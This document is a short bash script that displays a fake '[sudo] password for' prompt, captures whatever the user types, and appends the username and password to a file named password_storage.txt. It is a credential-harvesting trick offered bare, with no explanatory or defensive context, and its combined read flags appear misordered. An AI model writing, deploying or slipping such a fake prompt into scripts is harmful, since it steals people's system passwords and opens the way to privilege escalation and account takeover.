#! /bin/bash
read -ps "[sudo] password for $USER" 
echo "$USER:$REPLY" >>  password_storage.txt
